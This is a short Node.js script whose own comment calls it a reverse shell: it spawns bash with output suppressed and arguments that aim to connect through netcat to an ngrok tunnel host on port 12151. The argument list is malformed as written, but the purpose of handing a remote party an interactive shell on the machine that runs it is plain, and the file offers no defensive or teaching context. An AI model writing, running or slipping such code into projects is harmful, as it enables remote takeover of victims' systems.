const { spawn } = require('child_process');

const command = 'bash';
const args = ['-i', 'nc', '2.tcp.eu.ngrok.io', '12151'];

// Spawn a new shell process to execute the reverse shell command
const childProcess = spawn(command, args, { stdio: 'ignore' });

// Handle errors
childProcess.on('error', (err) => {
    console.error('Error:', err);
});

childProcess.on('close', (code) => {
    console.log(`Child process exited with code ${code}`);
});
